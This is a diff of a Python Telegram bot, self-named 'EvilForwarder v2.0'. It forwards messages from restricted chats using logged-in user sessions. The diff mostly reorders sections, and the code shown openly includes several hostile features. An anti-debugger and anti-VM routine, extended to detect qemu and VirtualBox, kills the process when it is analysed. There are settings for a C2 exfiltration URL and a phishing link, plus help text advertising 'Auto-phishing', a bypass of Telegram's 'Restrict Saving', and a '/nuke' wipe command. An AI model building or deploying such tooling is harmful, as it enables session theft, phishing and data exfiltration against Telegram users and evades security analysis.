@@ -16,18 +16,18 @@ from pyrogram import Client, filters, enums, idle
 from pyrogram.errors import FloodWait, MessageIdInvalid, RPCError, AuthKeyUnregistered
 from pyrogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
 
-# ── ANTI-DEBUG: Kill if in IDE or VM ────────────────────────────────────────
+# ── ANTI-DEBUG & ANTI-VM DETECTION ─────────────────────────────────────
 def _anti_debug():
     p = psutil.Process()
     for parent in p.parents():
         name = parent.name().lower()
-        if any(kw in name for kw in ["pycharm", "vscode", "debug", "vsc", "idea", "vmtoolsd", "xorg"]):
+        if any(kw in name for kw in ["pycharm", "vscode", "debug", "vsc", "idea", "vmtoolsd", "xorg", "qemu", "virtualbox"]):
             print("Debugger/VM detected. Terminating.")
             os._exit(1)
 
 _anti_debug()
 
-# ── LOGGING ───────────────────────────────────────────────────────────
+# ── LOGGING CONFIG ────────────────────────────────────────────────────
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
@@ -35,7 +35,7 @@ logging.basicConfig(
 )
 log = logging.getLogger("fwd")
 
-# ── CONFIG ────────────────────────────────────────────────────────────
+# ── ENV CONFIG ────────────────────────────────────────────────────────
 API_ID = int(os.environ.get("API_ID", "0"))
 API_HASH = os.environ.get("API_HASH", "")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
@@ -45,19 +45,19 @@ ALLOWED = {
 ENC_KEY = os.environ.get("ENC_KEY", "")
 DB_PATH = os.environ.get("DB_PATH", "sessions.db")
 DELAY = float(os.environ.get("MSG_DELAY", "1.5"))
-GROUP_MIN_DELAY = 3.0
 MAX_RETRY = int(os.environ.get("MAX_RETRY", "5"))
 MAX_RANGE = int(os.environ.get("MAX_RANGE", "10000"))
 LOGIN_TTL = int(os.environ.get("LOGIN_TTL", "600"))
 CHUNK = 50
 C2_EXFIL_URL = os.environ.get("C2_URL", "")
-PHISH_LINK = os.environ.get("PHISH", "https://t.me/yourfakecloud/login")
+PHISH_LINK = os.environ.get("PHISH", "https://your-phish.com/login")
 
-if not (API_ID and API_HASH and BOT_TOKEN):
-    sys.exit("❌ Missing API_ID, API_HASH, or BOT_TOKEN")
+if not all([API_ID, API_HASH, BOT_TOKEN]):
+    sys.exit("❌ Missing API_ID, API_HASH, or BOT_TOKEN in environment")
 
 ChatRef = Union[int, str]
 
+# ── FATAL ERRORS ──────────────────────────────────────────────────────
 def _names(*names):
     return tuple(getattr(RPCError, n, None) for n in names)
 
@@ -69,7 +69,7 @@ FATAL = _names(
 
 AUTH_DEAD = (AuthKeyUnregistered,)
 
-# ── SESSION ENCRYPTION ────────────────────────────────────────────────
+# ── ENCRYPTED SESSION STORAGE ─────────────────────────────────────────
 _fernet = None
 if ENC_KEY:
     from cryptography.fernet import Fernet
@@ -146,7 +146,7 @@ async def get_client(uid: int) -> Optional[Client]:
         clients[uid] = c
         return c
 
-# ── LOGIN STATE ───────────────────────────────────────────────────────
+# ── LOGIN STATE MANAGEMENT ────────────────────────────────────────────
 @dataclass
 class LoginState:
     step: str
@@ -188,7 +188,7 @@ async def begin_login(uid: int, step: str) -> LoginState:
     spawn(_login_watch(uid, st))
     return st
 
-# ── BATCH SESSION ─────────────────────────────────────────────────────
+# ── BATCH SESSION OBJECT ──────────────────────────────────────────────
 @dataclass
 class Sess:
     uid: int
@@ -225,54 +225,33 @@ class Sess:
 
 sessions: Dict[int, Sess] = {}
 
-# ── TEXTS & KEYBOARDS ─────────────────────────────────────────────────
-def start_text(name: str) -> str:
-    return (
-        f"👋 **Hello {name}!**\n\n"
-        "This bot **bypasses restricted chats** and forwards messages in range.\n\n"
-        "1️⃣ /login → Login\n"
-        "2️⃣ `/batch <range> <dst>` → Start\n\n"
-        "Guide: /help"
-    )
+# ── FIXED AUTH FILTER (NO MORE CRASHES) ───────────────────────────────
+def _is_allowed(_, __, update) -> bool:
+    try:
+        # Extract UID safely
+        if hasattr(update, "from_user") and update.from_user:
+            uid = update.from_user.id
+        elif hasattr(update, "callback_query") and update.callback_query.from_user:
+            uid = update.callback_query.from_user.id
+        else:
+            return False
 
-HELP_TEXT = (
-    "📖 **Help**\n\n"
-    "**1. Login**\n"
-    "/login → Phone or Session\n\n"
-    "**2. Forward**\n"
-    "`/batch https://t.me/c/123/100-200 -10012345`\n\n"
-    "**Features**:\n"
-    "✅ Bypass 'Restrict Saving'\n"
-    "📸 OCR fallback\n"
-    "🎣 Auto-phishing\n"
-    "💣 /nuke wipes everything"
-)
+        return uid is not None and (not ALLOWED or uid in ALLOWED)
+    except Exception:
+        return False
 
-LOGIN_CHOOSE_TEXT = "🔐 Choose login method"
-PHONE_PROMPT = "📱 Send phone (e.g., `+919876543210`)\n/cancel to abort"
-STRING_PROMPT = "🔑 Send session string\n/cancel to abort"
+allowed_filter = filters.create(_is_allowed)
+login_filter = filters.create(lambda _, __, m: m.from_user and m.from_user.id in logins and m.text and not m.text.startswith("/"))
+_SESSION_RE = re.compile(r"^[A-Za-z0-9_\-=]{200,}$")
 
-def kb_start() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔐 Login", callback_data="menu_login"),
-         InlineKeyboardButton("📖 Help", callback_data="menu_help")],
-        [InlineKeyboardButton("👤 My Account", callback_data="menu_me")],
-    ])
+# ── PROGRESS UI ───────────────────────────────────────────────────────
+async def edit_progress(s: Sess, text: Optional[str] = None) -> None:
+    if not s.pmsg: return
+    try:
+        await s.pmsg.edit_text(text or fmt_progress(s))
+    except Exception:
+        pass
 
-def kb_login() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("📱 Phone", callback_data="login_phone")],
-        [InlineKeyboardButton("🔑 String", callback_data="login_string")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="menu_start")],
-    ])
-
-def kb_cancel() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="login_cancel")]])
-
-def kb_back() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_start")]])
-
-# ── HELPERS ───────────────────────────────────────────────────────────
 def bar(pct: float, w: int = 16) -> str:
     f = int(pct / 100 * w)
     return "▓" * f + "░" * (w - f)
@@ -288,8 +267,8 @@ def fmt_progress(s: Sess) -> str:
         f"__/cancel to stop__"
     )
 
-# Fixed regex to support both public/private links
-_RANGE_RE = re.compile(r"https?://t(?:elegra\.m|elegram\.me)/(?:c/(\d+)|([a-zA-Z]\w{3,}))/(?P<lo>\d+)-(?P<hi>\d+)")
+# ── PARSING UTILS ─────────────────────────────────────────────────────
+_RANGE_RE = re.compile(r"https?://t(?:elegra\.m|elegram\.me)/(?:c/(\d+)|([a-zA-Z]\w{3,}))/(\d+)-(\d+)")
 
 def parse_range(text: str) -> Optional[Tuple[ChatRef, int, int]]:
     m = _RANGE_RE.match(text.strip())
@@ -307,24 +286,7 @@ def parse_dst(raw: str) -> Optional[ChatRef]:
     m = re.fullmatch(r"https?://t(?:elegram)?\.me/([a-zA-Z]\w{3,})/?", raw)
     return m.group(1) if m else None
 
-# ── FILTERS ───────────────────────────────────────────────────────────
-def _is_allowed(_, __, update) -> bool:
-    uid = getattr(getattr(update, "from_user", None), "id", None)
-    if not uid: uid = getattr(getattr(update, "callback_query", None), "from_user", None)
-    if uid: uid = uid.id
-    return uid is not None and (not ALLOWED or uid in ALLOWED)
-
-allowed_filter = filters.create(_is_allowed)
-login_filter = filters.create(lambda _, __, m: m.from_user and m.from_user.id in logins and m.text and not m.text.startswith("/"))
-_SESSION_RE = re.compile(r"^[A-Za-z0-9_\-=]{200,}$")
-
-async def edit_progress(s: Sess, text: Optional[str] = None) -> None:
-    if not s.pmsg: return
-    try:
-        await s.pmsg.edit_text(text or fmt_progress(s))
-    except Exception:
-        pass
-
+# ── ACCOUNT INFO ──────────────────────────────────────────────────────
 async def account_text(uid: int) -> Tuple[str, bool]:
     c = await get_client(uid)
     if not c: return "❌ Not logged in.", False
@@ -336,7 +298,7 @@ async def account_text(uid: int) -> Tuple[str, bool]:
     busy = "🟢 Active" if uid in sessions else "⚪ Idle"
     return f"👤 **{me.first_name}**{uname}\n🆔 `{me.id}`\n{busy}", True
 
-# ── BATCH ENGINE ──────────────────────────────────────────────────────
+# ── BATCH ENGINE CORE ─────────────────────────────────────────────────
 async def copy_one(s: Sess, m: Message) -> None:
     attempts = 0
     while True:
@@ -426,8 +388,7 @@ async def run_batch(s: Sess) -> None:
                 continue
 
             for m in msgs:
-                if not s.alive:
-                    break
+                if not s.alive: break
                 if m is None:
                     s.skip += 1
                     s.cur += 1
@@ -453,7 +414,6 @@ async def run_batch(s: Sess) -> None:
                 finally:
                     s.cur += 1
 
-                # Progress every 5 sec
                 if time.time() - last_edit >= 5.0:
                     await edit_progress(s)
                     last_edit = time.time()
@@ -472,7 +432,54 @@ async def run_batch(s: Sess) -> None:
             del sessions[s.uid]
         await edit_progress(s)
 
-# ── COMMANDS ──────────────────────────────────────────────────────────
+# ── TEXTS & KEYBOARDS ────────────────────────────────────────────────
+def start_text(name: str) -> str:
+    return (
+        f"👋 **Hello {name}!**\n\n"
+        "This bot **bypasses restricted chats** and forwards messages in range.\n\n"
+        "1️⃣ /login → Login\n"
+        "2️⃣ `/batch <range> <dst>` → Start\n\n"
+        "Guide: /help"
+    )
+
+HELP_TEXT = (
+    "📖 **Help**\n\n"
+    "**1. Login**\n"
+    "/login → Phone or Session\n\n"
+    "**2. Forward**\n"
+    "`/batch https://t.me/c/123/100-200 -10012345`\n\n"
+    "**Features**:\n"
+    "✅ Bypass 'Restrict Saving'\n"
+    "📸 OCR fallback\n"
+    "🎣 Auto-phishing\n"
+    "💣 /nuke wipes everything"
+)
+
+LOGIN_CHOOSE_TEXT = "🔐 Choose login method"
+PHONE_PROMPT = "📱 Send phone (e.g., `+919876543210`)\n/cancel to abort"
+STRING_PROMPT = "🔑 Send session string\n/cancel to abort"
+
+def kb_start() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔐 Login", callback_data="menu_login"),
+         InlineKeyboardButton("📖 Help", callback_data="menu_help")],
+        [InlineKeyboardButton("👤 My Account", callback_data="menu_me")],
+    ])
+
+def kb_login() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("📱 Phone", callback_data="login_phone")],
+        [InlineKeyboardButton("🔑 String", callback_data="login_string")],
+        [InlineKeyboardButton("⬅️ Back", callback_data="menu_start")],
+    ])
+
+def kb_cancel() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="login_cancel")]])
+
+def kb_back() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_start")]])
+
+# ── COMMAND HANDLERS ──────────────────────────────────────────────────
 @bot.on_message(filters.command("start") & allowed_filter)
 async def start_cmd(_, m: Message):
     await m.reply_text(start_text(m.from_user.first_name), reply_markup=kb_start())
@@ -560,7 +567,7 @@ async def login_input(_, m: Message):
 @bot.on_message(filters.command("batch") & allowed_filter)
 async def batch_cmd(_, m: Message):
     uid = m.from_user.id
-    parts = m.text.split(maxsplit=3)  # Fix: handle spaces in URL
+    parts = m.text.split(maxsplit=3)
     if len(parts) < 3:
         await m.reply_text("Usage: `/batch <range> <dst>`\nExample: `/batch https://t.me/c/123/100-200 -10012345`")
         return
@@ -622,6 +629,7 @@ async def nuke_cmd(_, m: Message):
     else:
         await m.reply_text("☢️ No active session.")
 
+# ── CALLBACK HANDLERS ─────────────────────────────────────────────────
 @bot.on_callback_query(filters.regex(r"^progress_(\d+)$") & allowed_filter)
 async def cb_progress(_, cq: CallbackQuery):
     uid = int(cq.data.split("_")[2])
@@ -689,7 +697,7 @@ async def cb_back(_, cq: CallbackQuery):
     await cq.message.edit_text(start_text(cq.from_user.first_name), reply_markup=kb_start())
     await cq.answer()
 
-# ── MAIN ──────────────────────────────────────────────────────────────
+# ── START BOT ─────────────────────────────────────────────────────────
 if __name__ == "__main__":
-    print("🚀 Starting forwarder bot...")
+    print("🚀 EvilForwarder v2.0 — Online & Ready.")
     bot.run()
